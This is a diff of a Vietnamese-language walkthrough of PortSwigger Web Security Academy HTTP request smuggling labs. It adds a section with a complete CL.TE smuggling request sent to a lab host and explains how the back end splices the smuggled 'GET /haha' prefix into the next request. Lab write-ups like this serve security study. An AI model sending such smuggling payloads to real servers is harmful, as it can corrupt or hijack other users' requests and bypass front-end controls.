@@ -72,8 +72,30 @@ x
 ```
 Sau khi submit request hai lần, website trả về lỗi "Unrecognized method GPOST`. Như vậy, bài lab được giải thành công.
 
-
 # 4. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
+Để exploit lỗ hổng CL.TE, ta cấu hình request sau:
+```
+POST / HTTP/1.1
+Host: 0aea0014046cafbbc16d670200f60046.web-security-academy.net
+Content-Length: 37
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+1
+x
+0
+
+GET /haha HTTP/1.1
+Foo: x
+```
+Với front-end server sử dụng CL, request sẽ chứa toàn bộ thông tin ở trên. Với backend-server sử dụng TE, request sẽ gồm từ `POST...` đến hết ký tự `0` (do là dấu hiệu kết thúc chunked data). Như vậy, đoạn `GET /haha...` sẽ được xử lý như một phần của request kế tiếp. Nếu request sau đó trỏ đến home page, nó sẽ trở thành:
+```
+GET /haha HTTP/1.1
+Foo: xGET / HTTP/1.1
+Host: 0aea0014046cafbbc16d670200f60046.web-security-academy.net
+...
+```
+Và kết quả, trả về 404 Not Found. Sau khi submit request, bài lab được giải thành công.
 
 # 5. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
 
